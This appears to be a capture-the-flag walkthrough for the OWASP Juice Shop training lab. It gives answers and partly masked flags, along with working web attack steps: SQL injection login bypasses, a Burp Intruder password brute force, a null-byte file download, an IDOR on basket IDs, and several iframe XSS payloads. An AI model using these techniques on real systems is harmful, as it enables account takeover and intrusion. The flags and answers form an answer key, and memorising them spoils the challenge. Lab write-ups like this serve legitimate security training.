# OWASP Juice Shop


- Deploy the VM attached to this task to get started! You can access this machine by using your browser-based machine, or if you're connected through OpenVPN.

	  no answer needed

- Once the machine has loaded, access it by copying and pasting its IP into your browser; if you're using the browser-based machine, paste the machines IP into a browser on that machine.

	  no answer needed

- What's the Administrator's email address?

	- `admin@juice-sh.op`

- What parameter is used for searching? 

	- `q`

- What show does Jim reference in his review?

	- `star trek`

- Log into the administrator account!

	- Perform a login request when Burp is capturing.

	~~~
		POST /rest/user/login HTTP/1.1
		Host: 10.10.122.116
		User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
		Accept: application/json, text/plain, */*
		Accept-Language: en-US,en;q=0.5
		Accept-Encoding: gzip, deflate
		Content-Type: application/json
		Content-Length: 49
		Origin: http://10.10.122.116
		Connection: close
		Referer: http://10.10.122.116/
		Cookie: io=XFm7soxYpXet9JAKAAAA; language=en; cookieconsent_status=dismiss
		{"email":"email@email.org","password":"password"}
	~~~
	
	- We change this request in:
	~~~
		POST /rest/user/login HTTP/1.1
		Host: 10.10.122.116
		User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
		Accept: application/json, text/plain, */*
		Accept-Language: en-US,en;q=0.5
		Accept-Encoding: gzip, deflate
		Content-Type: application/json
		Content-Length: 49
		Origin: http://10.10.122.116
		Connection: close
		Referer: http://10.10.122.116/
		Cookie: io=XFm7soxYpXet9JAKAAAA; language=en; cookieconsent_status=dismiss
		{"email":"' OR 1=1--","password":"password"}
	~~~
	- And forward this request.
	- `32***0f21372b*******608************0e02a`

- Log into the Bender account!

	- Capture another login request or change the previous one to this:
	~~~
		POST /rest/user/login HTTP/1.1
		Host: 10.10.122.116
		User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
		Accept: application/json, text/plain, */*
		Accept-Language: en-US,en;q=0.5
		Accept-Encoding: gzip, deflate
		Content-Type: application/json
		Content-Length: 45
		Origin: http://10.10.122.116
		Connection: close
		Referer: http://10.10.122.116/
		Cookie: io=XFm7soxYpXet9JAKAAAA; language=en; cookieconsent_status=dismiss;
		{"email":"bender@juice-sh.op'--","password":"edededededed"}
	~~~
	- `fb***762a3c*******9320************d4066`

- Bruteforce the Administrator account's password!

	- For the payload, we will be using the best1050.txt from Seclists. (Which can be installed via: `apt-get install seclists`)
	- You can load the list from `/usr/share/seclists/Passwords/Common-Credentials/best1050.txt`
	- Copy another new login request, right click and Send to Intruder.
	- Change the email to `admin@juice-sh.op`.
	- Clear all the `§` symbols and add them only to the password field.
	- Load the list into BurpSuite and Start the Attack.
	- See where request (into the results tab) has `200` as Status.
	- *Tips* On the above bar of results tab you can filter results hiding 3xx, 4xx, and 5xx response code.
	- `***10d06d*******7cd809************f1ac0e`

- Reset Jim's password!

	- Logout
	- Reset Jim's password
	- `094fb***48e52*******7d05************7257`

- Access the Confidential Document!

	- Navigate to the About Us page, and hover over the "Check out our terms of use".
	- The link is `something/ftp/legal.md`
	- The `/ftp/` folder is publicly exposed!
	- Download all the files in that folder.
	- Go to home and access the flag.
	- `edf9*812*******c5fee***************50c5b`

- Log into MC SafeSearch's account!

	- `mc.safesearch@juice-sh.op`, `Mr. N00dles`
	- `66bd*ffad9e6*******003f************5d7f0`

- Download the Backup file!

	- Add the poison NULL byte to the file you would like to download.
	- e.g. `http:<TARGET_IP>/ftp/file.md.bak%2500.md`
	- `b**********579e85*06fee************13795`

- Access the administration page!

	- Open the file `/main-es2015.js`.
	- You will find a path called `administration`.
	- 403
	- Log in as admin.
	- Go to `/administration` and grab the flag.
	- `946*79936********82200************6629a0`

- View another user's shopping basket!

	- Click on `your Basket`. Capture the request with Burp.
	- Capture `GET /rest/basket/1 HTTP/1.1` request.
	- Change the number id from 1 to 2 and forward the request.
	- `41b9*7a36*******4f0ba************ce52121`

- Remove all 5-star reviews!

	- Navigate to the `http://10.10.202.127/#/administration` page again and click the bin icon next to the review with 5 stars!
	- `50c97*cc*******446d61c************2266ef`

- Perform a DOM XSS!
	
	- Input this into the search bar `<iframe src="javascript:alert('xss')">`
	- `9aa*******c30d0*a1f5bb************efe0bf`

- Perform a persistent XSS!

	- Select `Account`, then `Security and Privacy` and then `Last Login IP`.
	- Select `logout` while capturing packets.
	- Add to the request the header `True-Client-IP: <iframe src="javascript:alert(`xss`)">`
	- `149aa*c*******a8a9314***********dc5f156`

- Perform a reflected XSS!

	- Login into the admin account and navigate to the `Order History` page.
	- From there you will see a "Truck" icon, clicking on that will bring you to the track result page. You will also see that there is an id paired with the order.
	- We will use the iframe XSS, <iframe src="javascript:alert(`xss`)">, in the place of the `5267-f73dcd000abcc353`
	- Refresh the page.
	- `23cefe*********9295b261***********60a0`

- Access the /#/score-board/ page

	- `7e***174*****baa03a7************2f72d*6e`
